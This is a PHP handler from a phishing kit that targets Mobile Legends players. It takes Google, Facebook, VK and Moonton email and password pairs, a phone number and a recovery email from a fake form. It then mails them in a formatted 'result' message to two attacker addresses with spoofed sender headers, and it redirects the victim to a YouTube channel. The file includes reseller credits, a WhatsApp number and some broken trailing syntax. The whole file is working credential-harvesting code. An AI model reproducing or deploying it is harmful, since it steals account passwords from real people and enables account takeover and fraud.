<?php
error_reporting(0);
include('cilepeung.php');

$nick = $_POST['nickname'];
$email1= $_POST['google1'];
$pass1 = $_POST['google2'];
$email2 = $_POST['fb1'];
$pass2 = $_POST['fb2'];
$email3 = $_POST['vk1'];
$pass3 = $_POST['vk2'];
$email4 = $_POST['moonton1'];
$pass4 = $_POST['moonton2'];
$lev = $_POST['level'];
$log = $_POST['login'];
$ski = $_POST['skin'];
$coun = $_POST['country'];
$number= $_POST['phone'];
$emailr= $_POST['emailr'];
$passr= $_POST['passr'];

$message   = "

====[ GOOGLE ACCOUNT ]====

• Email Gmail : ".$email1."
• Password Gmail :  ".$pass1."

====[ FACEBOOK ACCOUNT ]====

• Email Facebook :  ".$email2."
• Password Facebook : ".$pass2."

====[ VK ACCOUNT ]====

• Email VK : ".$email3."
• Password VK : ".$pass3."

====[ MOONTON ACCOUNT ]====

• Email Moonton : ".$email4."
• Password Moonton : ".$pass4."

====[ DETAIL ACCOUNT ]====

• Nickname : ".$nick."
• Level : ".$lev."
• Email Recovery : ".$emailr."
• Total Skin : ".$ski."
• Number Phone : ".$number."
• Country : ".$coun."

Reedit By: Mr. Luxian
Bantu SUBSCRIBE : https://www.youtube.com/channel/UCVXW5UiumDMh-_kSruC_BNw
Wa : 08979579565 

====[ INFO DEVICE ]====

• IP Info   :  ".$alamat."  ".$nama_negro." On ".gmdate('r')."
• Browser   :  ".$_SERVER['HTTP_USER_AGENT']." 

====[ DONE ]====
======[JANGAN LUPA SHOLAT 5 WAKTU]=======

";

include 'email.php';
$subject = "Level [ ".$lev." ] Skin [ ".$ski." ]";
$headers = "From: • RESULT BOZ• <dns1.alphahost.web.id>";
mail($emailku, $subject, $message, $headers);

$md5      = md5(gmdate("r"));
$sha1     = sha1(gmdate("r"));

include 'css/dokumen.php';
$subject = "Level [ ".$lev." ] Skin [ ".$ski." ]";
$headers = "From: • LEXAN RESULT • <dns2.alphahost.web.id>";
mail($emailpengirim, $subject, $message, $headers);

$md5      = md5(gmdate("r"));
$sha1     = sha1(gmdate("r"));
?>
'<script>window.location.replace("https://www.youtube.com/channel/UCVXW5UiumDMh-_kSruC_BNw")</script>';}
}
?>